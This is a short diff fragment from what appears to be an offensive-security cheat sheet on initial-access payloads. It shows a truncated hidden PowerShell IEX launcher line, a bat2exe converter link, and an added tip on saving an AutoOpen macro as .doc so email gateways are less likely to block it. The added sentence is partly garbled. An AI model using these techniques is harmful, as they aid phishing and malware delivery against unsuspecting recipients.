@@ -185,6 +185,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX
 - https://github.com/islamadel/bat2exe/releases/tag/2.0
 
 ## Simple macro
+- Save it as `.doc`. Macro in a `.docx` is not possible and the `.docm` has a huge! and might get blocked by email gateways.
 ```
 Sub AutoOpen()
 
